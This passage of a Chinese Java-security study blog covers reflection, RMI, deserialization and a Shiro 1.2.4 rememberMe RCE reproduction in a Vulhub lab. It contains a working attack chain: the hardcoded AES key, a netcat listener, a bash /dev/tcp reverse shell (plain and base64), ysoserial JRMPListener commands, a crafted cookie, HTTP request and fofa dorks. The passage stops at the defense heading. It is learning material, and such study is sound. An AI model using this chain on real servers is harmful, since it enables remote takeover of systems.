clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))).start();</span><br></pre></td></tr></table></figure>\n<p>不用强制类型转换时</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class=\"line\">clazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance(  Arrays.asList(&quot;calc.exe&quot;)));</span><br></pre></td></tr></table></figure>\n<p>反射可以提供动态特性</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void execute(String className, String methodName) throws Exception &#123;</span><br><span class=\"line\">Class clazz = Class.forName(className);</span><br><span class=\"line\">clazz.getMethod(methodName).invoke(clazz.newInstance());  \t&#125;</span><br></pre></td></tr></table></figure>\n<p><code>import java.lang.Runtime;</code>  该类可以用于执行任意命令</p>\n<p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用 forName 就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</p>\n<h3 id=\"rmi\"><a class=\"markdownIt-Anchor\" href=\"#rmi\">#</a> RMI</h3>\n<p>RMI 是 Remote Method Invocation 的缩写。</p>\n<p>要实现 RMI，服务器和客户端必须共享同一个接口。我们定义一个 <code>WorldClock</code>  接口，代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface WorldClock extends Remote &#123;</span><br><span class=\"line\">    LocalDateTime getLocalDateTime(String zoneId) throws RemoteException;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Java 的 RMI 规定此接口必须派生自 <code>java.rmi.Remote</code> ，并在每个方法声明抛出 <code>RemoteException</code> 。</p>\n<p>下一步是编写服务器的实现类，因为客户端请求的调用方法 <code>getLocalDateTime()</code>  最终会通过这个实现类返回结果。实现类 <code>WorldClockService</code>  代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class WorldClockService implements WorldClock &#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public LocalDateTime getLocalDateTime(String zoneId) throws RemoteException &#123;</span><br><span class=\"line\">        return LocalDateTime.now(ZoneId.of(zoneId)).withNano(0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们需要通过 Java RMI 提供的一系列底层支持接口，把上面编写的服务以 RMI 的形式暴露在网络上，客户端才能调用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Server &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws RemoteException &#123;</span><br><span class=\"line\">        System.out.println(&quot;create World clock remote service...&quot;);</span><br><span class=\"line\">        // 实例化一个WorldClock:</span><br><span class=\"line\">        WorldClock worldClock = new WorldClockService();</span><br><span class=\"line\">        // 将此服务转换为远程服务接口:</span><br><span class=\"line\">        WorldClock skeleton = (WorldClock) UnicastRemoteObject.exportObject(worldClock, 0);</span><br><span class=\"line\">        // 将RMI服务注册到1099端口:</span><br><span class=\"line\">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class=\"line\">        // 注册此服务，服务名为&quot;WorldClock&quot;:</span><br><span class=\"line\">        registry.rebind(&quot;WorldClock&quot;, skeleton);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上述代码主要目的是通过 RMI 提供的相关类，将我们自己的 <code>WorldClock</code>  实例注册到 RMI 服务上。RMI 的默认端口是 <code>1099</code> ，最后一步注册服务时通过 <code>rebind()</code>  指定服务名称为 <code>&quot;WorldClock&quot;</code> 。</p>\n<p>下一步我们就可以编写客户端代码。RMI 要求服务器和客户端共享同一个接口，因此我们要把 <code>WorldClock.java</code>  这个接口文件复制到客户端，然后在客户端实现 RMI 调用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Client &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws RemoteException, NotBoundException &#123;</span><br><span class=\"line\">        // 连接到服务器localhost，端口1099:</span><br><span class=\"line\">        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);</span><br><span class=\"line\">        // 查找名称为&quot;WorldClock&quot;的服务并强制转型为WorldClock接口:</span><br><span class=\"line\">        WorldClock worldClock = (WorldClock) registry.lookup(&quot;WorldClock&quot;);</span><br><span class=\"line\">        // 正常调用接口方法:</span><br><span class=\"line\">        LocalDateTime now = worldClock.getLocalDateTime(&quot;Asia/Shanghai&quot;);</span><br><span class=\"line\">        // 打印调用结果:</span><br><span class=\"line\">        System.out.println(now);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Java 的 RMI 严重依赖序列化和反序列化，而这种情况下可能会造成严重的安全漏洞，因为 Java 的序列化和反序列化不但涉及到数据，还涉及到二进制的字节码，即使使用白名单机制也很难保证 100% 排除恶意构造的字节码。</p>\n<p>这就是完整的通信过程，我们可以发现，整个过程进行了两次 TCP 握手，也就是我们实际建立了两次<br>\n TCP 连接。<br>\n第一次建立 TCP 连接是连接远端 192.168.135.142 的 1099 端口，这也是我们在代码里看到的端口，二 者进行沟通后，我向远端发送了一个 “Call” 消息，远端回复了一个 “ReturnData” 消息，然后我新建了一 个 TCP 连接，连到远端的 33769 端口。</p>\n<p>细细阅读数据包我们会发现，在 “ReturnData” 这个包中，返回了目标的 IP 地址 192.168.135.142 ，其 后跟的一个字节 \\x00\\x00\\x83\\xE9 ，刚好就是整数 33769 的网络序列：</p>\n<p>首先客户端连接 Registry，并在其中寻找 Name 是 Hello 的对象，这个对应数据 流中的 Call 消息；然后 Registry 返回一个序列化的数据，这个就是找到的 Name=Hello 的对象，这个对应 数据流中的 ReturnData 消息；客户端反序列化该对象，发现该对象是一个远程对象，地址<br>\n在 192.168.135.142:33769 ，于是再与这个地址建立 TCP 连接；在这个新的连接中，才执行真正远程 方法调用，也就是 hello () 。</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221117161651171.png\" alt=\"image-20221117161651171\" style=\"zoom:80%;\" />\n<p>RMI Registry 就像一个网关，他自己是不会执行远程方法的，但 RMI Server 可以在上面注册一个 Name  到对象的绑定关系；RMI Client 通过 Name 向 RMI Registry 查询，得到这个绑定关系，然后再连接 RMI  Server；最后，远程方法实际上在 RMI Server 上调用。</p>\n<h3 id=\"攻击rmi-registry\"><a class=\"markdownIt-Anchor\" href=\"#攻击rmi-registry\">#</a> 攻击 RMI registry</h3>\n<p>当我们可以访问目标 RMI Registry 的时候</p>\n<p>RMI Registry 是一个远程对象管理的地方，可以理解为一个远程对象的 “后台”。我们可以尝试直 接访问 “后台” 功能，比如修改远程服务器上 Hello 对应的对象：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RemoteHelloWorld h = new RemoteHelloWorld();</span><br><span class=\"line\">Naming.rebind(&quot;rmi://192.168.135.142:1099/Hello&quot;, h);</span><br></pre></td></tr></table></figure>\n<p>Java 对远程访问 RMI Registry 做了限制，只有来源地址是 localhost 的时候，才能调用 rebind、  bind、unbind 等方法。</p>\n<p>codebase 是一个地址，告诉 Java 虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的  CLASSPATH，但 CLASSPATH 是本地路径，而 codebase 通常是远程 URL，比如 http、ftp 等。<br>\n如果我们指定 codebase=http://example.com/ ，然后加载 org.vulhub.example.Example 类，则 Java 虚拟机会下载这个文件 <a href=\"http://example.com/org/vulhub/example/Example.class\">http://example.com/org/vulhub/example/Example.class</a> ，并作为 Example 类的字节码。</p>\n<p>RMI 的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻 找类。如果某一端反序列化时发现一个对象，那么就会去自己的 CLASSPATH 下寻找想对应的类；如果在 本地没有找到这个类，就会去远程加载 codebase 中的类。</p>\n<p>在 RMI 中，我们是可以将 codebase 随着序列化数据一起传输的，服务器在接收到这个数据后就会去<br>\n CLASSPATH 和指定的 codebase 寻找类，由于 codebase 被控制导致任意命令执行漏洞。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221117164157276.png\" alt=\"image-20221117164157276\"></p>\n<p>所以只有满足如下条件的 RMI 服务器才能被攻击： 安装并配置了 SecurityManager</p>\n<p>Java 版本低于 7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false</p>\n<p>我们只需要编译一个恶意类，将其 class 文件放置在 Web 服务器的 / RMIClient$Payload.class 即可。</p>\n<p>我们使用 SerializationDumper 查看这段序列化数据：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221117170707850.png\" alt=\"image-20221117170707850\"></p>\n<p>可见，我们的 codebase 是通过 [Ljava.rmi.server.ObjID; 的 classAnnotations 传递的。<br>\n所以，即使我们没有 RMI 的客户端，只需要修改 classAnnotations 的值，就能控制 codebase，使其 指向攻击者的恶意网站。</p>\n<p>在序列化 Java 类的时候用到了一个类，叫 ObjectOutputStream 。这个类内部有一个方法  annotateClass ， ObjectOutputStream 的子类有需要向序列化后的数据里放任何内容，都可以重写 这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。</p>\n<p>我们在分析序列化数据时看到的 classAnnotations ，实际上就是 annotateClass 方法写入的内容。</p>\n<p>Java 在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是  ObjectOutputStream ，开发者可以将任何内容写入这个 stream 中；反序列化时，会调用  readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。</p>\n<p>我们写入的字符串被放在 objectAnnotation 的位置。在反序列化时，我读取了这个字符串，并将其输出：，是在 writeobject 写入</p>\n<p>ysoserial 可以让用户根据自己选择的利用链，生成反 序列化利用数据，通过将这些数据发送给目标，从而执行用户预先定义的命令。</p>\n<p>利用链也叫 “gadget chains”，我们通常称为 gadget。如果你学过 PHP 反序列化漏洞，那么就可以将  gadget 理解为一种方法，它连接的是从触发位置开始到执行命令的位置结束</p>\n<p>ysoserial 大部分的 gadget 的参数就是一条命令，比如这里是 id 。生成好的 POC 发送给目标，如 果目标存在反序列化漏洞，并满足这个 gadget 对应的条件，则命令 id 将被执行</p>\n<p>用 ysoserial 可以很容 易地生成这个 gadget 对应的 POC：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"序列化和反序列化\"><a class=\"markdownIt-Anchor\" href=\"#序列化和反序列化\">#</a> 序列化和反序列化</h3>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120161615273.png\" alt=\"image-20221120161615273\" style=\"zoom:67%;\" />\n<p>主要应用场景：</p>\n<p>1、持久化内存数据</p>\n<p>2、网络传输对象</p>\n<p>3、远程方法调用 (RMI)</p>\n<p>java 可以序列化成字节流，也可以序列化为 json 格式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestToFile</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">        Person obj= <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;wuya&quot;</span>, <span class=\"number\">666</span>);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">filePath</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;D:/wuya.xxx&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 序列化</span></span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span>  <span class=\"variable\">outStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(filePath));</span><br><span class=\"line\">        outStream.writeObject(obj);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 反序列化</span></span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span>  <span class=\"variable\">inStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(filePath));</span><br><span class=\"line\">        <span class=\"comment\">// readObject 方法</span></span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">readObject</span> <span class=\"operator\">=</span> (Person)inStream.readObject();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;反序列化后：name=&quot;</span>+readObject.name +<span class=\"string\">&quot;,age=&quot;</span>+readObject.age);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120163923386.png\" alt=\"image-20221120163923386\"></p>\n<p>很明显，序列化后的字节流的开头为 aced</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzgvZG9jcy9wbGF0Zm9ybS9zZXJpYWxpemF0aW9uL3NwZWMvc2VyaWFsVE9DLmh0bWw=\">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzgvZG9jcy9wbGF0Zm9ybS9zZXJpYWxpemF0aW9uL3NwZWMvcHJvdG9jb2wuaHRtbCNhMTAyNTg=\">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html#a10258</span></p>\n<p>详细格式如上</p>\n<p>如果两个包不在一个路径下，需要引入依赖</p>\n<blockquote>\n<p>序列化</p>\n<p>java.io.ObjectOutputStream.writeObject()</p>\n<p>反序列化</p>\n<p>java.io.ObjectInputStream.readObject()</p>\n</blockquote>\n<p>如果在序列化的时候 override 了 readobject，那么在反序列化的时候就不会再执行 OOI 的代码</p>\n<p>如果此时重写的代码中含有可控参数，那么会造成漏洞</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.Serializable;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">UnsafeClass</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> String name;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//重写readObject()方法</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">readObject</span><span class=\"params\">(java.io.ObjectInputStream in)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">        <span class=\"comment\">//执行默认的readObject()方法</span></span><br><span class=\"line\">        in.defaultReadObject();</span><br><span class=\"line\">        <span class=\"comment\">//执行命令</span></span><br><span class=\"line\">        Runtime.getRuntime().exec(<span class=\"string\">&quot;calc.exe&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">UnsafeTest</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String args[])</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">UnsafeClass</span> <span class=\"variable\">Unsafe</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UnsafeClass</span>();</span><br><span class=\"line\">        Unsafe.name = <span class=\"string\">&quot;hacked by wuya&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 序列化</span></span><br><span class=\"line\">        <span class=\"type\">FileOutputStream</span> <span class=\"variable\">fos</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;D:/wuya.yyy&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">os</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(fos);</span><br><span class=\"line\">        os.writeObject(Unsafe);</span><br><span class=\"line\">        os.close();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//从 反序列化</span></span><br><span class=\"line\">        <span class=\"type\">FileInputStream</span> <span class=\"variable\">fis</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;D:/wuya.yyy&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">ois</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(fis);</span><br><span class=\"line\">        <span class=\"type\">UnsafeClass</span> <span class=\"variable\">objectFromDisk</span> <span class=\"operator\">=</span> (UnsafeClass) ois.readObject();</span><br><span class=\"line\">        System.out.println(objectFromDisk.name);</span><br><span class=\"line\">        ois.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>那么我们要利用这个漏洞，就需要找到一些重写了 readobject 的类，同时 readobject 类中可以接受参数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package sun.reflect.annotation;</span><br><span class=\"line\">AnnotationInvocationHandler</span><br><span class=\"line\"></span><br><span class=\"line\">package javax.management;</span><br><span class=\"line\">BadAttributeValueExpException</span><br></pre></td></tr></table></figure>\n<h3 id=\"shiro-124反序列化\"><a class=\"markdownIt-Anchor\" href=\"#shiro-124反序列化\">#</a> Shiro 1.2.4 反序列化</h3>\n<p>Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro 框架直观、易用，同时也能提供健壮的安全性。</p>\n<ol>\n<li>rememberMe 生成过程：序列化→AES 加密→Base64 编码→生成 rememberMe 内容。</li>\n<li>服务端接收 Cookie 值时：检索 Cookie 中的 rememberMe 内容→Base64 解密→AES 解密 (加密密钥硬编码)→反序列化 (未做处理)。</li>\n</ol>\n<p>Apache Shiro 默认使用了 CookieRememberMeManager，其处理 Cookie 的流程：得到 rememberMe 的 Cookie 值→Base64 解码→AES 解密→反序列化。然而 AES 的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的 RCE 漏洞。</p>\n<p>关键因素：AES 的加密密钥在 Shiro 的 1.2.4 之前版本中使用的是硬编码：kPH+bIxk5D2deZiIxcaaaA==，只要找到密钥后就可以通过构造恶意的序列化对象进行编码，加密，然后作为 Cookie 加密发送，服务端接收后会解密并触发反序列化漏洞。在 1.2.4 之后，ASE 秘钥就不为默认了，需要获取到 Key 才可以进行渗透</p>\n<p>在不选择 remember-me 的时候该字段为 delete me，勾选后为刚刚加密的数据</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NoaXJvL0NWRS0yMDE2LTQ0Mzcv\">Vulhub - Docker-Compose file for vulnerability environment</span></p>\n<p>登录过程</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122183841649.png\" alt=\"image-20221122183841649\"></p>\n<p>验证过程</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122183907917.png\" alt=\"image-20221122183907917\"></p>\n<p>JRMP 全称为 Java Remote Method Protocol，也就是 Java 远程方法协议</p>\n<p>利用方式 1</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122190553667.png\" alt=\"image-20221122190553667\"></p>\n<p>利用方式 2</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122190635789.png\" alt=\"image-20221122190635789\"></p>\n<p>漏洞特征</p>\n<p>set-cookie 是否存在 remeberMe=deleteMe</p>\n<p>fofa dork</p>\n<p>header= “rememberme=deleteMe” 、header= “shiroCookie”</p>\n<p>检测工具</p>\n<p>1、shiro_tool.jar 纯字符版</p>\n<p>2、ShiroExploitV2.51</p>\n<p>3、shiro_attack-v2.0.jar</p>\n<p>硬编码的 aeskey</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122193315250.png\" alt=\"image-20221122193315250\"></p>\n<p>复现：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122193640835.png\" alt=\"image-20221122193640835\"></p>\n<p>1. 攻击机监听 nc -lvvp 7777</p>\n<p>2. 生成 payload，并编码</p>\n<p>bash -i &gt;&amp; /dev/tcp/192.168.142.132/7777 0&gt;&amp;1</p>\n<p>工具：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcmVzLXguY29tL3Rvb2xzL3J1bnRpbWUtZXhlYy8=\">https://ares-x.com/tools/runtime-exec/</span></p>\n<p>结果：</p>\n<p bash,-i=\"\">bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIvNzc3NyAwPiYx}|{base64,-d}|</p>\n<p>3. 攻击机连接 JRMP</p>\n<p>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}”</p>\n<p>4. 生成 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 shiro.py 192.168.142.132:8888</span><br><span class=\"line\">结果：</span><br><span class=\"line\">rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+cX7z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQqrBCW4D+hmUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCgQ7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VTknFZqVj4gMsfGS2OA9NZ/2jVIFhTdhvU3w==</span><br></pre></td></tr></table></figure>\n<p>5. 发送 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /doLogin HTTP/1.1</span><br><span class=\"line\">Host: 192.168.142.128:8080</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 47</span><br><span class=\"line\">Origin: http://192.168.142.128:8080</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Referer: http://192.168.142.128:8080/doLogin</span><br><span class=\"line\">Cookie:</span><br><span class=\"line\">JSESSIONID=BE2042921ED0A1E58436F6FBD5654581;rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+cX7z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQqrBCW4D+hmUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCgQ7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VTknFZqVj4gMsfGS2OA9NZ/2jVIFhTdhvU3w== </span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">username=a&amp;password=b&amp;rememberme=remember-me</span><br></pre></td></tr></table></figure>\n<p>修复和防御</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 